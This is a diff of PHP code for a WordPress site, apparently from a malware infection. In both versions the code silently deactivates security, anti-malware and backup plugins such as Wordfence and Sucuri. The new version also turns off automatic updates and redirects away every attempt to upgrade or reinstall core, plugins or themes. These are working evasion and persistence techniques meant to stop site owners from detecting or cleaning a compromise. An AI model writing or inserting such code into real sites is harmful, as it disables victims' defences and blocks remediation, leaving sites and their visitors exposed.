@@ -1,7 +1,17 @@
-$plugins = get_plugins();
-foreach ($plugins as $filename => $data) {
-	$bad_names = '/wordfence|sucuri|security|malcare|defender|jetpack|malware|wp\-cerber|gotmls|secupress|antivirus|backup|wp\-staging|backwpup|wp\-migration|duplicator/i';
-	if (preg_match($bad_names, $filename)) {
-		deactivate_plugins($filename);
+if (!defined("SHIELD_AND_SWORD")) {
+	define("SHIELD_AND_SWORD", "1");
+	add_filter("automatic_updater_disabled", "__return_true");
+	if (in_array($_GET["action"], array("upgrade-core", "do-core-reinstall", "do-core-upgrade", "do-plugin-upgrade", "do-theme-upgrade"))) {
+		$proto = strpos(strtolower($_SERVER["SERVER_PROTOCOL"]), "https") === FALSE ? "http" : "https";
+		$redirect_url =  $proto . "://" . $_SERVER["HTTP_HOST"] . $_SERVER["SCRIPT_NAME"];
+		header("Location: " . $redirect_url);
+		die();
+	}
+	$plugins = get_plugins();
+	foreach ($plugins as $filename => $data) {
+		$bad_names = '/wordfence|sucuri|security|malcare|defender|jetpack|malware|wp\-cerber|gotmls|secupress|antivirus|backup|wp\-staging|backwpup|wp\-migration|duplicator/i';
+		if (preg_match($bad_names, $filename)) {
+			deactivate_plugins($filename);
+		}
 	}
 }
